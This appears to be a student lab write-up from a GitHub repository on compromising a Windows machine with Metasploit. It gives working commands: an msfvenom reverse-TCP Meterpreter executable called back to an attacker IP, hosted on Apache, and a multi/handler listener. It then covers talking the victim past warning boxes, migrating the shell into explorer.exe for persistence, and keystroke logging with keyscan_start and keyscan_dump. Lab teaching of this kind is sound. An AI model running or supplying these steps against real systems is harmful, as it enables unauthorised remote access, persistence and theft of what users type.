# Compromising-windows-using-Metasploit
Compromising windows using Metasploit
# Metasploit
Compromising windows using Metasploit

# AIM:

To Compromise windows using Metasploit .

## DESIGN STEPS:

### Step 1:

Install kali linux either in partition or virtual box or in live mode

### Step 2:

Investigate on the various categories of tools as follows:

### Step 3:

Open terminal and try execute some kali linux commands

## EXECUTION STEPS AND ITS OUTPUT:
## PROGRAM:
Find the attackers ip address using ifconfig

## OUTPUT:
Create a malicious executable file fun.exe using msenom command msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.2 -f exe > fun.exe
![image](https://github.com/vatsan143/Compromising-windows-using-Metasploit/assets/147368204/bba88293-f16c-46eb-ba94-e523881e18ca)

copy the fun.exe into the apache /var/www/html folder

![image](https://github.com/vatsan143/Compromising-windows-using-Metasploit/assets/147368204/a842e7c5-d95f-4fbc-9e31-fa7a5759eea7)


Start apache server sudo systemctl apache2 start and Check the status of apache2
![image](https://github.com/vatsan143/Compromising-windows-using-Metasploit/assets/147368204/c62ac1bf-a11e-4bf7-a182-1e109c47c9d9)



## Invoke msfconsole:
## OUTPUT:

![image](https://github.com/vatsan143/Compromising-windows-using-Metasploit/assets/147368204/f5f79203-a5f9-498c-905b-51bf94eb2611)


ype help or a question mark "?" to see the list of all available commands you can use inside msfconsole.

Starting a command and control Server use multi/handler set PAYLOAD windows/meterpreter/reverse_tcp set LHOST 0.0.0.0 exploit

![image](https://github.com/vatsan143/Compromising-windows-using-Metasploit/assets/147368204/be190bea-b5c5-427f-978a-9354831ecee1)


On the target Windows machine, open a Web browser and open this URL, replacing the IP address with the IP address of your Kali machine: http://192.168.1.2/fun.exe The file "fun.exe" downloads.

![image](https://github.com/vatsan143/Compromising-windows-using-Metasploit/assets/147368204/867a1063-34c1-4d03-a119-7de55d09dd60)

Bypass any warning boxes, double-click the file, and allow it to run.

On kali give the command exploit 

![image](https://github.com/vatsan143/Compromising-windows-using-Metasploit/assets/147368204/fb733a24-d66a-4892-bd01-71bed2215e9d)


To see a list of processes, at the meterpreter > prompt, execute this command: ps ⇒ can see the fun.exe process running with pid 1156

The Metasploit shell is running inside the "fun.exe" process. If the user closes that process, or logs off, the connection will be lost. To become more persistent, we'll migrate to a process that will last longer. Let's migrate to the winlogon process. At the meterpreter > prompt, execute this command:

migrate -N explorer.exe at meterpreter > prompt, execute this command: netstat A list of network connections appears, including one to a remote port of 4444, as highlighted in the image below. Notice the "PID/Program name" value for this connection, which is redacted

Post Exploitation The target is now owned. Following are meterpreter commands for key capturing in the target machine keyscan_start Begins capturing keys typed in the target. On the Windows target, open Notepad and type in some text, such as your name.

![image](https://github.com/vatsan143/Compromising-windows-using-Metasploit/assets/147368204/69993afa-fd2c-44f7-934e-60af6a3f93e2)



keyscan_dump Shows the keystrokes captured so far
![image](https://github.com/vatsan143/Compromising-windows-using-Metasploit/assets/147368204/14c06ee9-81dc-43de-9921-338272a076a0)




## RESULT:
The Metasploit framework is  used to compromise windows and is examined successfully.
